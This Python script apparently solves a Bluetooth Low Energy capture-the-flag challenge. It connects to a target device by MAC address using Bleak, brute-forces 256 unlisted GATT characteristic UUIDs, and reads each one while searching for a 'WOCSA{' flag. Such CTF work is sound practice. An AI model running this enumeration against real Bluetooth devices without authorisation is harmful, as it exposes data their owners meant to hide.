import asyncio
from bleak import BleakClient
from tqdm import tqdm

MAC = input("Enter target MAC address: ")

SERVICE_UUID = "b100d000-0000-1000-8000-00805f9b34fb"

async def main():
    async with BleakClient(MAC) as client:
        # Services are discovered automatically on connect in recent Bleak versions
        services = client.services

        print("[*] Visible characteristics in target service:")
        for svc in services:
            if svc.uuid == SERVICE_UUID:
                for char in svc.characteristics:
                    print(f"    {char.uuid}")
        print()

        # Brute-force XX in b100d000-C0XX-1000-8000-00805f9b34fb
        # Manufacturer data hint reveals high byte = 0xC0 → iterate 0xC000..0xC0FF
        print("[*] Brute-forcing b100d000-C0XX-... (XX = 0x00 to 0xFF)")

        with tqdm(range(0x100), unit="uuid", ncols=70) as bar:
            for xx in bar:
                uuid = f"b100d000-c0{xx:02x}-1000-8000-00805f9b34fb"
                bar.set_postfix_str(f"c0{xx:02x}")
                try:
                    val = await client.read_gatt_char(uuid)
                    decoded = val.decode("utf-8", errors="ignore")
                    tqdm.write(f"[+] {uuid} → {decoded[:60]}")
                    if "WOCSA{" in decoded:
                        tqdm.write(f"\n[!!!] FLAG FOUND: {decoded}")
                        return
                except Exception:
                    pass  # UUID not present, continue

        print("[-] Flag not found in range 0xC000–0xC0FF")

asyncio.run(main())
